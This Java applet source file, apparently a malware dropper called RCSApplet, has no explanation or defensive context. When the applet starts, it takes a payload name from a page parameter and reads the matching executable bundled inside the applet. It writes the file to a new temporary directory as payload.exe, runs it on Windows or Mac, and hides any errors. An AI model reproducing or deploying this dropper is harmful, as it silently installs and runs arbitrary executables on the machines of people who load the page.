import java.applet.*;
import java.awt.*;
import java.io.*;
import java.util.Locale;
import java.util.Properties;

public class RCSApplet extends Applet {
	
	private static final String OS_NAME = System.getProperty("os.name").toLowerCase(Locale.ENGLISH);
	
	public void init() {
		Process f;
		String payloadPrefix = getParameter("first");
		InputStream payloadStream = null;
		
		System.out.println("Dropping " + payloadPrefix);
		
		Properties props = new Properties();
		Class clazz = RCSApplet.class;
		String clazzFile = clazz.getName().replace('.', '/')+".class";
		
		System.out.println(clazzFile);
		
		try {
			// get payload path
			String payloadPath = "/" + payloadPrefix;
			if (isWindows()) {
				System.out.println("Running on Windows");
				payloadPath += ".exe";
			} else if (isMac()) {
				System.out.println("Running on Mac");
			} else {
				System.out.println("Running on an unknown operating system, exiting!");
				System.exit(0);
			}
			
			// open stream to payload
			payloadStream = clazz.getResourceAsStream(payloadPath);
			
			// write payload to temporary path (inside %tmp% in Windows)
			File dummyTempFile = File.createTempFile("~spawn", ".tmp");
			dummyTempFile.delete();
			File tempDir = new File(dummyTempFile.getAbsolutePath()+".dir");
			tempDir.mkdir();
			
			File executableFile = new File(tempDir, "payload.exe");
			writeEmbeddedFile(payloadStream, executableFile);
			
			// execute payload
			System.out.println("Running " + executableFile.getCanonicalPath());
			f = Runtime.getRuntime().exec(new String[] {executableFile.getCanonicalPath()});
			f.waitFor();
			
		} catch (IOException ioe) {
			
		} catch (NullPointerException npe) {
			
		} catch (InterruptedException ie) {
			
		} finally {
			try {
				payloadStream.close();
			} catch (IOException ioe) {
				
			} catch (NullPointerException npe) {
				
			}
		}
	}
	
	private static boolean isWindows() {
		if (OS_NAME.startsWith("win"))
			return true;
		return false;
	}
	
	private static boolean isMac() {
		if (OS_NAME.startsWith("mac"))
			return true;
		return false;
	}
	
	private static void writeEmbeddedFile(InputStream in, File targetFile) throws FileNotFoundException, IOException {
		FileOutputStream fos = new FileOutputStream(targetFile);
		byte[] buf = new byte[4096];
		int len;
		while ((len = in.read(buf)) != -1) {
			fos.write(buf,0,len);
		}
		fos.close();
	}
	
}
